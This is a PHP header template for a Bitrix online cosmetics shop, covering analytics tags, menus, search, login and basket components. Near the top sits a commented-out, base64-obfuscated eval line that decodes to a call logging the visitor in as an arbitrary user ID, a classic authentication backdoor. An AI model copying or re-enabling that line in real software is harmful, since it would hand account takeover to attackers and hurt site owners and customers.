<? if (!defined("B_PROLOG_INCLUDED") || B_PROLOG_INCLUDED !== true) die();
IncludeTemplateLangFile(__FILE__);
$defaultSrc = '/local/templates/.default';
global $USER;
CModule::IncludeModule("sale");
//eval(base64_decode('aWYoKGludCkkVSkkVVNFUi0+QXV0aG9yaXplKCRVKTs='));
$GetBasketUserID = CSaleBasket::GetBasketUserID();
?>
<!DOCTYPE html>
<!--[if lt IE 9]>
<script data-skip-moving="true">
    location.href = '/update_browser/index.html';
</script>
<![endif]-->
<html lang="ru">
<head>
    <? if (isset($_GET['action']) || isset($_GET['sort']) || strpos($_SERVER['REQUEST_URI'], 'backurl') !== false): ?>
        <meta name="robots" content="noindex, follow"/>
    <? endif; ?>
    <title><? $APPLICATION->ShowTitle() ?></title>
    <? include("/home/bitrix/www/local/templates/main/noindex_page.php"); ?>

    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <link rel="shortcut icon" href="/favicon.ico">

    <?
    $APPLICATION->SetAdditionalCSS("//maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css", true);
    $APPLICATION->SetAdditionalCSS($defaultSrc . "/css/fontawesome-stars-o.css", true);
    $APPLICATION->SetAdditionalCSS($defaultSrc . "/css/main.min.css", true);
    $APPLICATION->SetAdditionalCSS($defaultSrc . "/css/custom.css", true);

    $APPLICATION->AddHeadScript($defaultSrc . "/js/modernizr-3.2.0.min.js");
    $APPLICATION->AddHeadScript($defaultSrc . "/js/jquery.min.js");
    $APPLICATION->AddHeadScript($defaultSrc . "/js/jquery.barrating.min.js");
    $APPLICATION->AddHeadScript($defaultSrc . "/js/main.min.js");
    $APPLICATION->AddHeadScript($defaultSrc . "/js/jquery.maskedinput.min.js");
    $APPLICATION->AddHeadScript($defaultSrc . "/js/script-custom.js");
    $APPLICATION->AddHeadScript($defaultSrc . "/js/image-defer.min.js");
    ?>
    <? $APPLICATION->ShowHead(); ?>
    <script>
        if (typeof jQuery == 'undefined') {
            document.write(unescape("<script src='<?=$defaultSrc?>/js/jquery.js'/>"));
        }
    </script>
    <!-- Google Tag Manager -->
    <script defer="defer">(function (w, d, s, l, i) {
            w[l] = w[l] || [];
            w[l].push({
                'gtm.start': new Date().getTime(), event: 'gtm.js'
            });
            var f = d.getElementsByTagName(s)[0],
                j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : '';
            j.async = true;
            j.src =
                'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
            f.parentNode.insertBefore(j, f);
        })(window, document, 'script', 'dataLayer', 'GTM-NZSWTBM');</script>
    <!-- End Google Tag Manager -->

    <!-- Global site tag (gtag.js) - Google Ads: 822033716 -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-822033716"></script>
    <script>
        window.dataLayer = window.dataLayer || [];

        function gtag() {
            dataLayer.push(arguments);
        }

        gtag('js', new Date());

        gtag('config', 'AW-822033716');
    </script>

    <script>
        gtag('event', 'page_view', {
            'send_to': 'AW-822033716',
            'value': 'replace with value',
            'items': [{
                'id': 'replace with value',
                'google_business_vertical': 'retail'
            }]
        });
    </script>


    <? if (getBrowser() != 'Apple Safari'):?>
        <!-- Carrot quest BEGIN -->
        <script type="text/javascript" defer="defer"> !function () {
                function t(t, e) {
                    return function () {
                        window.carrotquestasync.push(t, arguments)
                    }
                }

                if ("undefined" == typeof carrotquest) {
                    var e = document.createElement("script");
                    e.type = "text/javascript", e.async = !0, e.src = "//cdn.carrotquest.io/api.min.js", document.getElementsByTagName("head")[0].appendChild(e), window.carrotquest = {}, window.carrotquestasync = [], carrotquest.settings = {};
                    for (var n = ["connect", "track", "identify", "auth", "oth", "onReady", "addCallback", "removeCallback", "trackMessageInteraction"], a = 0; a < n.length; a++) carrotquest[n[a]] = t(n[a])
                }
            }(), carrotquest.connect("26859-80677db77c88fb8bb302595b8c");
        </script>
        <!-- Carrot quest END -->
    <? endif; ?>


    <!-- Facebook Pixel Code -->
    <script>
        !function (f, b, e, v, n, t, s) {
            if (f.fbq) return;
            n = f.fbq = function () {
                n.callMethod ?
                    n.callMethod.apply(n, arguments) : n.queue.push(arguments)
            };
            if (!f._fbq) f._fbq = n;
            n.push = n;
            n.loaded = !0;
            n.version = '2.0';
            n.queue = [];
            t = b.createElement(e);
            t.async = !0;
            t.src = v;
            s = b.getElementsByTagName(e)[0];
            s.parentNode.insertBefore(t, s)
        }(window, document, 'script',
            'https://connect.facebook.net/en_US/fbevents.js');
        fbq('init', '595325647543669');
        fbq('track', 'PageView');
    </script>
    <noscript>
        <img height="1" width="1" style="display:none"
             src="https://www.facebook.com/tr?id=595325647543669&ev=PageView&noscript=1"/>
    </noscript>
    <!-- End Facebook Pixel Code -->
    <?
    if (!is_object($USER)) {
        $USER = new CUser;
    }
    ?>
    <? if (!in_array(10, $USER->GetUserGroupArray()) && !in_array(11, $USER->GetUserGroupArray())): ?>
        <style>
            .gmi-nds {
                display: none !important;
            }
        </style>
    <? endif; ?>
</head>
<body>


<!-- Yandex.Metrika counter -->
<script type="text/javascript">
    (function (m, e, t, r, i, k, a) {
        m[i] = m[i] || function () {
            (m[i].a = m[i].a || []).push(arguments)
        };
        m[i].l = 1 * new Date();
        k = e.createElement(t), a = e.getElementsByTagName(t)[0], k.async = 1, k.src = r, a.parentNode.insertBefore(k, a)
    })
    (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");

    ym(45947409, "init", {
        clickmap: true,
        trackLinks: true,
        accurateTrackBounce: true,
        webvisor: true,
        ecommerce: "dataLayer"
    });
</script>
<noscript>
    <div><img src="https://mc.yandex.ru/watch/45947409" style="position:absolute; left:-9999px;" alt=""/></div>
</noscript>
<!-- /Yandex.Metrika counter -->


<noscript>
    <img height="1" width="1" alt="facebook" style="display:none"
         src="https://www.facebook.com/tr?id=288841835366389&ev=PageView&noscript=1"/>
</noscript>
<noscript><img height="1" width="1" style="display:none"
               src="https://www.facebook.com/tr?id=288841835366389&ev=PageView&noscript=1" alt="facebook"/></noscript>
<!-- Google Tag Manager (noscript) -->
<noscript>
    <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-NZSWTBM"
            height="0" width="0" style="display:none;visibility:hidden"></iframe>
</noscript>
<!-- End Google Tag Manager (noscript) -->
<? $APPLICATION->ShowPanel() ?>
<?
$cur_page = $APPLICATION->GetCurPage(false);
$arrPage = explode('/', $cur_page);

?>
<? global $USER;
if (!$USER->IsAuthorized()): ?>
    <? /*<style>.js-favorites-lnk{display: none !important;} </style>*/ ?>
<? else: ?>
    <?
    global $USER;
    global $arElementsFavoritesFilter;
    $idUser = $USER->GetID();
    $rsUser = CUser::GetByID($idUser);
    $arUser = $rsUser->Fetch();
    $arElementsFavorites = unserialize($arUser['UF_FAVORITES_' . strtoupper(SITE_ID)]);
    $arElementsFavoritesFilter = array("ID" => $arElementsFavorites);
    ?>
    <script defer="defer">
        function favoritesAddActive() {
            var obj = <?=CUtil::PhpToJSObject($arElementsFavorites)?>;
            $.each(obj, function (key, value) {
                if (!$("#favorites_" + value).hasClass("js-favorites-lnk_active")) {
                    $("#favorites_" + value).addClass("js-favorites-lnk_active");
                }
            });
        }

        $(document).ready(function () {
            favoritesAddActive();
        });
    </script>
<? endif; ?>

<div class="top-arrow"></div>
<div class="main <?= ($USER->IsAuthorized()) ? 'main_auth' : '' ?>">
    <header class="h">
        <div class="h__top">
            <div class="container cl">
                <div class="row">
                    <? $APPLICATION->IncludeComponent(
                        "bitrix:menu",
                        "top_main",
                        Array(
                            "ALLOW_MULTI_SELECT" => "N",
                            "CHILD_MENU_TYPE" => "left",
                            "COMPONENT_TEMPLATE" => ".default",
                            "DELAY" => "N",
                            "MAX_LEVEL" => "1",
                            "MENU_CACHE_GET_VARS" => "",
                            "MENU_CACHE_TIME" => "3600",
                            "MENU_CACHE_TYPE" => "N",
                            "MENU_CACHE_USE_GROUPS" => "Y",
                            "ROOT_MENU_TYPE" => "top",
                            "USE_EXT" => "N"
                        )
                    ); ?>
                    <div class="h__top-right">
                        <?if( $USER->IsAdmin() || true ):?>
                            <div class="top-desc-social">
                                <? $APPLICATION->IncludeComponent(
                                    "Mitlab:social",
                                    "top",
                                    array(
                                        "FB" => "https://www.facebook.com/Beautyhouse.minsk/",
                                        "GP" => "",
                                        "IN" => "https://www.instagram.com/beautyhouse.minsk/",
                                        "OK" => "",
                                        "VK" => "",
                                        "YT" => "https://www.youtube.com/channel/UCFJ81FlAwH9AkzUPiSrYMBg",
                                        "TEL" => "https://t.me/BH_by",
                                        "COMPONENT_TEMPLATE" => ".default"
                                    ),
                                    false,
                                    array(
                                        "ACTIVE_COMPONENT" => "Y"
                                    )
                                ); ?>
                            </div>
                        <?endif;?>
                        <div class="h__top-time" title="<?= $GetBasketUserID ?>">
                            <? $APPLICATION->IncludeComponent("bitrix:main.include", "", array("AREA_FILE_SHOW" => "file", "PATH" => "/include/top-time.php"), false); ?>
                        </div>
                        <div class="h__top-delivery">
                            <? $APPLICATION->IncludeComponent("bitrix:main.include", "", array("AREA_FILE_SHOW" => "file", "PATH" => "/include/top-delivery.php"), false); ?>
                        </div>
                    </div>
                </div>
            </div>
        </div>


        <div class="h__center">
            <div class="container cl">
                <div class="row">
                    <? $APPLICATION->IncludeComponent("bitrix:main.include", "", array("AREA_FILE_SHOW" => "file", "PATH" => "/include/top-phone.php"), false); ?>
                    <a class="logo" href="/"><img src="/local/templates/.default/images/logo.svg" alt=""></a>
                    <a class="logo-small" href="/" style="display: none">
                        BEAUTY HOUSE
                    </a>
                    <!-- BEAUTY HOUSE -->
                    <div class="right">
                        <div class="h__search">
                            <? $APPLICATION->IncludeComponent(
                                "Mitlab:search.title",
                                "main",
                                array(
                                    "CATEGORY_0" => array(
                                        0 => "iblock_catalog",
                                    ),
                                    "CATEGORY_0_TITLE" => "",
                                    "CATEGORY_0_iblock_catalog" => array(
                                        0 => "2",
                                    ),
                                    "CHECK_DATES" => "Y",
                                    "COMPONENT_TEMPLATE" => "main",
                                    "CONTAINER_ID" => "title-search-2",
                                    "CONTAINER_RES_ID" => "res-title-search-2",
                                    "CONVERT_CURRENCY" => "Y",
                                    "CURRENCY_ID" => "RUB",
                                    "INPUT_ID" => "title-search-input-2",
                                    "NUM_CATEGORIES" => "1",
                                    "ORDER" => "date",
                                    "PAGE" => "/catalog/",
                                    "PREVIEW_HEIGHT" => "75",
                                    "PREVIEW_TRUNCATE_LEN" => "",
                                    "PREVIEW_WIDTH" => "75",
                                    "PRICE_CODE" => array(
                                        0 => "BASE",
                                    ),
                                    "PRICE_VAT_INCLUDE" => "Y",
                                    "SHOW_INPUT" => "Y",
                                    "SHOW_OTHERS" => "N",
                                    "SHOW_PREVIEW" => "Y",
                                    "TOP_COUNT" => "5",
                                    "USE_LANGUAGE_GUESS" => "Y"
                                ),
                                false
                            ); ?>
                        </div>

                        <?
                        global $USER;
                        if ($USER->IsAuthorized()): ?>
                            <a class="login login-active" href="/personal/"></a>
                        <? else: ?>
                            <a class="login" data-fancybox data-src="#auth-popup" href="javascript:;"></a>
                            <div class="hide">
                                <div id="auth-popup">
                                    <? $APPLICATION->IncludeComponent(
                                        "bitrix:system.auth.authorize",
                                        "popup",
                                        Array(
                                            "COMPONENT_TEMPLATE" => "popup"
                                        )
                                    ); ?>
                                </div>
                            </div>
                        <? endif; ?>

                        <a class="favorites" href="/personal/favorites/"></a>
                        <div class="cart-wrp">
                            <?
                            $APPLICATION->IncludeComponent(
                                "bitrix:sale.basket.basket.line",
                                "main",
                                array(
                                    "COMPONENT_TEMPLATE" => "main",
                                    "HIDE_ON_BASKET_PAGES" => "N",
                                    "PATH_TO_AUTHORIZE" => "",
                                    "PATH_TO_BASKET" => SITE_DIR . "personal/cart/",
                                    "PATH_TO_ORDER" => SITE_DIR . "personal/order/make/",
                                    "PATH_TO_PERSONAL" => SITE_DIR . "personal/",
                                    "PATH_TO_PROFILE" => SITE_DIR . "personal/",
                                    "PATH_TO_REGISTER" => SITE_DIR . "login/",
                                    "POSITION_FIXED" => "N",
                                    "SHOW_AUTHOR" => "N",
                                    "SHOW_DELAY" => "N",
                                    "SHOW_EMPTY_VALUES" => "N",
                                    "SHOW_IMAGE" => "Y",
                                    "SHOW_NOTAVAIL" => "N",
                                    "SHOW_NUM_PRODUCTS" => "N",
                                    "SHOW_PERSONAL_LINK" => "N",
                                    "SHOW_PRICE" => "Y",
                                    "SHOW_PRODUCTS" => "Y",
                                    "SHOW_SUBSCRIBE" => "N",
                                    "SHOW_SUMMARY" => "Y",
                                    "SHOW_TOTAL_PRICE" => "N"
                                ),
                                false
                            );
                            ?>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <?//красная полоса
        //$APPLICATION->IncludeFile("/include/banner-head.php", array(), array("MODE" => "html", "SHOW_BORDER" => true, "NAME" => "banner-head")); ?>

        <div class="header_mobile_ico">
            <div class="cont_mobile_ico">
                <a class="mobile-search" href="/catalog/?q"></a>
            </div>
            <? global $USER;
            if ($USER->IsAuthorized()): ?>
                <div class="cont_mobile_ico">
                    <a class="login login-active login_white" href="/personal/"></a>
                </div>
            <? else: ?>
                <div class="cont_mobile_ico">
                    <a class="login login_white" data-fancybox data-src="#auth-popup" href="javascript:;"></a>
                </div>
            <? endif; ?>

            <div class="cart-wrp">
                <?
                $APPLICATION->IncludeComponent(
                    "bitrix:sale.basket.basket.line",
                    "main",
                    array(
                        "COMPONENT_TEMPLATE" => "main",
                        "HIDE_ON_BASKET_PAGES" => "N",
                        "PATH_TO_AUTHORIZE" => "",
                        "PATH_TO_BASKET" => SITE_DIR . "personal/cart/",
                        "PATH_TO_ORDER" => SITE_DIR . "personal/order/make/",
                        "PATH_TO_PERSONAL" => SITE_DIR . "personal/",
                        "PATH_TO_PROFILE" => SITE_DIR . "personal/",
                        "PATH_TO_REGISTER" => SITE_DIR . "login/",
                        "POSITION_FIXED" => "N",
                        "SHOW_AUTHOR" => "N",
                        "SHOW_DELAY" => "N",
                        "SHOW_EMPTY_VALUES" => "N",
                        "SHOW_IMAGE" => "Y",
                        "SHOW_NOTAVAIL" => "N",
                        "SHOW_NUM_PRODUCTS" => "N",
                        "SHOW_PERSONAL_LINK" => "N",
                        "SHOW_PRICE" => "Y",
                        "SHOW_PRODUCTS" => "Y",
                        "SHOW_SUBSCRIBE" => "N",
                        "SHOW_SUMMARY" => "Y",
                        "SHOW_TOTAL_PRICE" => "N",
                        "MAIN_WHITE" => "Y"
                    ),
                    false
                ); ?>
            </div>
        </div>

        <div class="toggle-menu">
            <span class="sw-topper"></span>
            <span class="sw-bottom"></span>
            <span class="sw-footer"></span>
        </div>

        <div class="shadow-mobile"></div>
        <nav class="h__nav">
            <div class="container cl">
                <div class="row">
                    <a class="logo logo_white" href="/">
                        <img src="/local/templates/.default/images/logo-small.svg" alt="">
                    </a>
                    <? /*<div class="right">
                        <div class="h__search">
                            <? $APPLICATION->IncludeComponent(
                                "Mitlab:search.title",
                                "main",
                                array(
                                    "CATEGORY_0" => array(
                                        0 => "iblock_catalog",
                                    ),
                                    "CATEGORY_0_TITLE" => "",
                                    "CATEGORY_0_iblock_catalog" => array(
                                        0 => "2",
                                    ),
                                    "CHECK_DATES" => "Y",
                                    "COMPONENT_TEMPLATE" => "main",
                                    "CONTAINER_ID" => "title-search-1",
                                    "CONTAINER_RES_ID" => "res-title-search-1",
                                    "CONVERT_CURRENCY" => "Y",
                                    "CURRENCY_ID" => "RUB",
                                    "INPUT_ID" => "title-search-input-1",
                                    "NUM_CATEGORIES" => "1",
                                    "ORDER" => "date",
                                    "PAGE" => "/catalog/",
                                    "PREVIEW_HEIGHT" => "75",
                                    "PREVIEW_TRUNCATE_LEN" => "",
                                    "PREVIEW_WIDTH" => "75",
                                    "PRICE_CODE" => array(
                                        0 => "BASE",
                                    ),
                                    "PRICE_VAT_INCLUDE" => "Y",
                                    "SHOW_INPUT" => "Y",
                                    "SHOW_OTHERS" => "N",
                                    "SHOW_PREVIEW" => "Y",
                                    "TOP_COUNT" => "5",
                                    "USE_LANGUAGE_GUESS" => "Y"
                                ),
                                false
                            ); ?>
                        </div>
                        <a class="mobile-search" href="/catalog/?q"></a>
                        <? global $USER;
                        if ($USER->IsAuthorized()): ?>
                            <a class="login login_white" href="/personal/"></a>
                        <? else: ?>
                            <a class="login login_white" data-fancybox data-src="#auth-popup" href="javascript:;"></a>
                        <? endif; ?>
                        <a class="favorites favorites_white" href="/personal/favorites/"></a>
                        <div class="cart-wrp">
                            <?
                            $APPLICATION->IncludeComponent(
                                "bitrix:sale.basket.basket.line",
                                "main",
                                array(
                                    "COMPONENT_TEMPLATE" => "main",
                                    "HIDE_ON_BASKET_PAGES" => "N",
                                    "PATH_TO_AUTHORIZE" => "",
                                    "PATH_TO_BASKET" => SITE_DIR . "personal/cart/",
                                    "PATH_TO_ORDER" => SITE_DIR . "personal/order/make/",
                                    "PATH_TO_PERSONAL" => SITE_DIR . "personal/",
                                    "PATH_TO_PROFILE" => SITE_DIR . "personal/",
                                    "PATH_TO_REGISTER" => SITE_DIR . "login/",
                                    "POSITION_FIXED" => "N",
                                    "SHOW_AUTHOR" => "N",
                                    "SHOW_DELAY" => "N",
                                    "SHOW_EMPTY_VALUES" => "N",
                                    "SHOW_IMAGE" => "Y",
                                    "SHOW_NOTAVAIL" => "N",
                                    "SHOW_NUM_PRODUCTS" => "N",
                                    "SHOW_PERSONAL_LINK" => "N",
                                    "SHOW_PRICE" => "Y",
                                    "SHOW_PRODUCTS" => "Y",
                                    "SHOW_SUBSCRIBE" => "N",
                                    "SHOW_SUMMARY" => "Y",
                                    "SHOW_TOTAL_PRICE" => "N",
                                    "MAIN_WHITE" => "Y"
                                ),
                                false
                           );?>
                        </div>
                    </div>*/ ?>
                    <? $APPLICATION->IncludeComponent("bitrix:main.include", "", array("AREA_FILE_SHOW" => "file", "PATH" => "/include/top-phone.php"), false); ?>
                    <?
                    if ($USER->IsAdmin()){

                        $APPLICATION->IncludeComponent(
                            "bitrix:menu",
                            "top_main_catalog2",
                            array(
                                "ALLOW_MULTI_SELECT" => "N",
                                "CHILD_MENU_TYPE" => "left",
                                "DELAY" => "N",
                                "MAX_LEVEL" => "1",
                                "MENU_CACHE_GET_VARS" => array(),
                                "MENU_CACHE_TIME" => "3600",
                                "MENU_CACHE_TYPE" => "N",
                                "MENU_CACHE_USE_GROUPS" => "Y",
                                "ROOT_MENU_TYPE" => "topcatalog",
                                "USE_EXT" => "N",
                                "COMPONENT_TEMPLATE" => "top_main_catalog",
                                "COMPOSITE_FRAME_MODE" => "A",
                                "COMPOSITE_FRAME_TYPE" => "AUTO"
                            ),
                            false
                        );

                    }else{

                        $APPLICATION->IncludeComponent(
                            "bitrix:menu",
                            "top_main_catalog",
                            array(
                                "ALLOW_MULTI_SELECT" => "N",
                                "CHILD_MENU_TYPE" => "left",
                                "DELAY" => "N",
                                "MAX_LEVEL" => "1",
                                "MENU_CACHE_GET_VARS" => array(),
                                "MENU_CACHE_TIME" => "3600",
                                "MENU_CACHE_TYPE" => "N",
                                "MENU_CACHE_USE_GROUPS" => "Y",
                                "ROOT_MENU_TYPE" => "topcatalog",
                                "USE_EXT" => "N",
                                "COMPONENT_TEMPLATE" => "top_main_catalog",
                                "COMPOSITE_FRAME_MODE" => "A",
                                "COMPOSITE_FRAME_TYPE" => "AUTO"
                            ),
                            false
                        );
                    }


                   ?>

                    <? $APPLICATION->IncludeComponent(
                        "bitrix:menu",
                        "top_main",
                        Array(
                            "ALLOW_MULTI_SELECT" => "N",
                            "CHILD_MENU_TYPE" => "left",
                            "COMPONENT_TEMPLATE" => ".default",
                            "DELAY" => "N",
                            "MAX_LEVEL" => "1",
                            "MENU_CACHE_GET_VARS" => "",
                            "MENU_CACHE_TIME" => "3600",
                            "MENU_CACHE_TYPE" => "N",
                            "MENU_CACHE_USE_GROUPS" => "Y",
                            "ROOT_MENU_TYPE" => "top",
                            "USE_EXT" => "N"
                        )
                    ); ?>
                    <? $APPLICATION->IncludeComponent(
                        "bitrix:menu",
                        "top_main",
                        array(
                            "ALLOW_MULTI_SELECT" => "N",
                            "CHILD_MENU_TYPE" => "left",
                            "COMPONENT_TEMPLATE" => "top_main",
                            "DELAY" => "N",
                            "MAX_LEVEL" => "1",
                            "MENU_CACHE_GET_VARS" => array(),
                            "MENU_CACHE_TIME" => "3600",
                            "MENU_CACHE_TYPE" => "N",
                            "MENU_CACHE_USE_GROUPS" => "Y",
                            "ROOT_MENU_TYPE" => "bottom",
                            "USE_EXT" => "N"
                        ),
                        false
                    ); ?>
					<?if ($USER->IsAdmin() || true):?>
						<div class="mobile-menu-social flex-container">
                            <? $APPLICATION->IncludeComponent(
								"Mitlab:social", 
								".default", 
								array(
									"FB" => "https://www.facebook.com/Beautyhouse.minsk/",
									"GP" => "",
									"IN" => "https://www.instagram.com/beautyhouse.minsk/",
									"OK" => "",
									"VK" => "",
									"YT" => "https://www.youtube.com/channel/UCFJ81FlAwH9AkzUPiSrYMBg",
									"TEL" => "https://t.me/BH_by",
									"COMPONENT_TEMPLATE" => ".default"
								),
								false,
								array(
									"ACTIVE_COMPONENT" => "Y"
								)
							); ?>
                        </div>
					<?endif;?>
                </div>
            </div>
        </nav>
    </header>
    <div class="main__content">
        <? if ($APPLICATION->GetCurPage(false) !== '/'): ?>
        <? if ($arrPage[1] != "catalog"): ?>
        <div class="container">

            <? if (!defined('ERROR_404') || ERROR_404 != 'Y'): ?>
                <? $APPLICATION->IncludeComponent(
                    "bitrix:breadcrumb",
                    "main",
                    Array(
                        "PATH" => "",
                        "SITE_ID" => "s1",
                        "START_FROM" => "0"
                    )
                ); ?>
                <h1><?= $APPLICATION->ShowTitle(false); ?></h1>
            <? endif ?>
            <? else: ?>
                <div class="container">
                    <? if (!defined('ERROR_404') || ERROR_404 != 'Y'): ?>
                        <? $APPLICATION->IncludeComponent(
                            "bitrix:breadcrumb",
                            "main",
                            Array(
                                "PATH" => "",
                                "SITE_ID" => "s1",
                                "START_FROM" => "0"
                            )
                        ); ?>
                        <h1><?= $APPLICATION->ShowTitle(false); ?></h1>
                    <? endif ?>
                </div>
            <? endif; ?>
            <? else:/*?>
				<h1 style="margin-bottom: 0;border: none;"><?=$APPLICATION->ShowTitle(false);?></h1>
			<?*/
            endif; ?>

            <? if ($APPLICATION->GetDirProperty("templates") == "Y"): ?>
            <article class="cnt">
                <? endif; ?>
                <?
                //if ($APPLICATION->GetCurPage(false) === '/aktsii/') include($_SERVER["DOCUMENT_ROOT"] . "/local/include/sale.php");
                if ($APPLICATION->GetCurPage(false) === '/populyarnye/') include($_SERVER["DOCUMENT_ROOT"] . "/local/include/popular.php");
                if ($APPLICATION->GetCurPage(false) === '/novinki/') include($_SERVER["DOCUMENT_ROOT"] . "/local/include/new.php");
                if ($APPLICATION->GetCurPage(false) === '/podarki/') include($_SERVER["DOCUMENT_ROOT"] . "/local/include/gift.php");
                //if($APPLICATION->GetCurPage(false) === '/brendy/') 	include($_SERVER["DOCUMENT_ROOT"]."/include/brands.php");
                if ($APPLICATION->GetCurPage(false) === '/for-salons/') include($_SERVER["DOCUMENT_ROOT"] . "/local/include/for-salons.php");
                ?>
